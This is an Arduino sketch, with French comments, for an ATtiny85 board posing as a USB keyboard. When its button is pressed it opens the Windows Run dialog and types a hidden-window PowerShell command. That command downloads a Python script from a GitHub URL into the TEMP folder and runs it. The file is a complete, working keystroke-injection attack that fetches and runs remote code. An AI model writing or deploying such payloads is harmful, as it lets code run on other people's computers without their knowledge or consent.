#include "DigiKeyboardFr.h"

#define LED    1
#define BUTTON 2

void setup() {
  // Configure la broche numérique
  pinMode(LED, OUTPUT);

  // Active la résistance de pull-up
  pinMode(BUTTON, INPUT_PULLUP);

  // Initialise la connexion
  DigiKeyboardFr.sendKeyStroke(0);
}

void loop() {
  digitalWrite(LED, HIGH);
  bool buttonState = digitalRead(BUTTON); // Low = bouton pressé

  // Lance le script si le bouton est pressé
  if (buttonState == LOW) {
    digitalWrite(LED, LOW);
    DigiKeyboardFr.delay(500);
    digitalWrite(LED, HIGH);

    // Ouvre l'exécuteur
    DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboardFr.delay(500);

    // Récupère un script sur internet et l'exécute
    DigiKeyboardFr.print("powershell -w hidden -Command \"if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/blob/main/BannerScreen/lock.pyw -OutFile $env:TEMP\\s.pyw; python $env:TEMP\\s.pyw }\"");
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(500);

    // Fait clignoté la LED pour indiquer que c'est terminé
    for (int i = 0; i < 3; i++) {
      digitalWrite(LED, LOW);
      DigiKeyboardFr.delay(500);
      digitalWrite(LED, HIGH);
      DigiKeyboardFr.delay(500);
    }
  }
}